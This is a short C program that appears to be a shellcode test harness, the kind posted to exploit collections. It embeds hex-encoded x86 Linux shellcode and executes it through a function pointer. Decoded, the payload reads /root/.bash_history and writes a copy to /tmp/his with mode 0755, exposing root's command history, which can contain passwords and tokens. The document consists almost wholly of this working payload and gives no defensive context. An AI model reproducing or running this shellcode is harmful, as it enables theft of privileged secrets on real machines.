#include<stdio.h>
#include<string.h>
unsigned char code[] = \
"\x31\xc0\xb0\x05\x31\xc9\x51\x68\x74\x6f\x72\x79\x68\x5f\x68\x69\x73\x68\x62\x61\x73\x68\x68\x6f\x74\x2f\x2e\x68\x2f\x2f\x72\x6f\x89\xe3\xcd\x80\x89\xc3\xb0\x03\x89\xe7\x89\xf9\x66\xba\xff\xff\xcd\x80\x96\xb0\x05\x31\xc9\x51\x68\x2f\x68\x69\x73\x68\x2f\x74\x6d\x70\x89\xe3\xb1\x41\x66\xba\xed\x01\xcd\x80\x89\xc3\xb0\x04\x89\xf9\x66\xba\xff\xff\xcd\x80\x31\xc0\x31\xdb\xb0\x01\xcd\x80"
;
main()
{
	printf("Press ENTER key to Continue\n");
	getchar();
	printf("Payload shellcode Lenght: %d\n", strlen(code));
	int (*ret)() = (int(*)())code;

	ret();

}
